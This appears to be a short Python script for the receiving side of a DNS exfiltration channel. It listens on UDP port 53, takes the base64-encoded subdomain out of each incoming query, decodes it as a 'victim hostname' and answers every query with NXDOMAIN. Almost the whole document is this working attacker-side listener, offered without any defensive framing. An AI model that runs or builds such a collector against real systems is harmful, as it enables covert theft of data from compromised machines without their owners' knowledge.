import socket
import base64
import re

def main():

   
   #creating a UDP socket, and binding all addresses to listen on 53
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(("127.0.0.1", 53))
    print("Address bound and listening")

    while True:
        data, client_address = server_socket.recvfrom(1024) #gathers client request info
        print(f"Connection from {client_address}")

        # Construct DNS response with NXDOMAIN
        response = construct_nxdomain_response(data)
        
        #There is probably a better way to do this.  Essentially this is grabbing the subdomain that is being passed to our server
        info = parse_dns_query(data)
        result = re.match(r'(.+?)\s*=', info.decode())
        resp = result.group(1)
        hostname = base64.b64decode(resp + "=")
        print(f"Victim hostname is: {hostname}")

        # Send NXDOMAIN response back to the client
        server_socket.sendto(response, client_address)
    
def parse_dns_query(data):
    sub = ""
    # Extract the domain name from the DNS query, will parse subdomain later
    domain = b""
    i = 12
    while data[i] != 0:
        domain += data[i:i+1]
        i += 1
    return domain

def construct_nxdomain_response(data):
    # Grab the transaction ID from the query
    transaction_id = data[:2]

    # Build DNS response with NXDOMAIN flag
    response = transaction_id + b"\x81\x83" + b"\x00\x01\x00\x00\x00\x00\x00\x00" + data[12:]

    return response

if __name__ == "__main__":
    main()
